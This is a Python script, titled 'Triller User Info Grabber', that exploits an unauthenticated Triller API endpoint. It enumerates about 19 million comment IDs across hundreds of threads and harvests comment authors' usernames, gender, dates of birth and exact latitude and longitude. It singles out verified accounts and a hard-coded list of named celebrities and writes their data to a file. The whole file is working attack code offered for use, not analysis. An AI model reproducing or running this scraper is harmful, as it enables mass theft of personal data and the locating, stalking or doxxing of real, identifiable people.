import os

import requests
import threading


class Main:
    def __init__(self):
        self.variables = {
            'total_ids': 19_337_500,
            'celebrities': (
                'charlidamelio', 'lelepons', 'dixiedamelio', 'kimberlyloaiza', 'garyvee', 'matue30',
                'doneazi', 'YemiAlade', 'nimo', 'officialmonstax', 'sadeckwaff', 'mcguime',
                'imfrenchbaloo', 'shaodree', 'motalkofficial', 'imagewashere', 'oxladeofficial',
                'irwerm', 'neaksworld', 'amberay', 'kyreedatsme', 'kingimprint', 'lillexic',
                'sharimarie', 'edwinhonoret', 'chythegreatest'
            ),
            'verified': 0,
            'unverified': 0,
            'duplicates': 0,
            'useful': 0,
            'errors': 0,
            'checked': []
        }

    def _checker(self, ID):
        try:
            info = requests.post(
                f'https://social.triller.co/v1.5/api/comments/{ID}/flag', headers={
                    'Host': 'social.triller.co',
                    'Content-Type': 'application/json',
                    'Connection': 'keep-alive',
                    'Signature': 'yilhVtwyT9Bheg5YkpFb24dOER40arYi/dZ4pULxvPQ=',
                    'Accept': '/',
                    'User-Agent': 'Triller/14.4 (iPhone; iOS 13.7; Scale/3.00)',
                    'Accept-Language': 'sv-SE;q=1, en-US;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Length': '152'
                }, json={'auth_token': '123'}
            ).json()['comment']['author']
        except Exception:
            self.variables['errors'] += 1
        else:
            if 'error' not in info:
                if info['verified_user'] or info['username'] in self.variables['celebrities']:
                    if info['username'] not in self.variables['checked']:
                        self.variables['checked'].append(info['username'])
                        self.variables['verified'] += 1

                        content = (
                            f'Username: {info["username"]}\n'
                            f'Gender: {info["gender"]}\n'
                            f'Date of Birth: {info["date_of_birth"]}\n'
                            f'Location: {info["location_lat"]}, {info["location_lon"]}\n'
                            f'Platform: {info["platform"]}\n'
                            '-----------------------------------------------'
                        )

                        if info['location_lat'] is not None:
                            self.variables['useful'] += 1
                            print(content)
                        with open('Saved.txt', 'a', encoding='UTF-8', errors='replace') as f:
                            f.write(f'{content}\n')
                    else:
                        self.variables['duplicates'] += 1
                else:
                    self.variables['unverified'] += 1

    def _title_updater(self):
        while (
            checked := self.variables["verified"] + self.variables["unverified"]
        ) < self.variables['total_ids']:
            os.system(
                f'title [Triller User Info Grabber] - Checked: {checked}/'
                f'{self.variables["total_ids"]} ('
                f'{round(((checked / self.variables["total_ids"]) * 100), 3)}%) ^| Verified: '
                f'{self.variables["verified"]} ({self.variables["useful"]} useful) ^| Unverified: '
                f'{self.variables["unverified"]} ^| Duplicates: {self.variables["duplicates"]} ^| E'
                f'rrors: {self.variables["errors"]}'
            )

    def multi_threading(self):
        threading.Thread(target=self._title_updater).start()

        for i in range(2, self.variables['total_ids']):
            attempting = True

            while attempting:
                if threading.active_count() <= 300:
                    threading.Thread(target=self._checker, args=(i,)).start()
                    attempting = False


if __name__ == '__main__':
    os.system('cls && title [Triller User Info Grabber]')
    main = Main()
    main.multi_threading()
